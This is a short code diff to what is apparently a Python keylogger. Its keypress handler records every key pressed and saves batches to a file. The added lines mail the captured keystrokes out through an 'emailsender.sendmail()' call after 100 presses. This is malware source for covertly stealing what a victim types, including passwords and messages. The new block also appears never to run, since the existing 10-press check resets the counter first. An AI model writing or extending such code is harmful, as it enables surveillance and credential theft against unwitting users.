@@ -53,11 +53,21 @@ def on_press(key):
     count+=1
     print("{0} pressed".format (key))
 
+
+    if count >= 100:
+            count=0
+            write_file(keys)
+            keys=[]
+            #send the mail
+            emailsender.sendmail()
+            
     #if the count is greater than 10 save to file
     if count >= 10:
         count=0
         write_file(keys)
         keys=[]
+
+    
 
 
 #check if program is getting ended
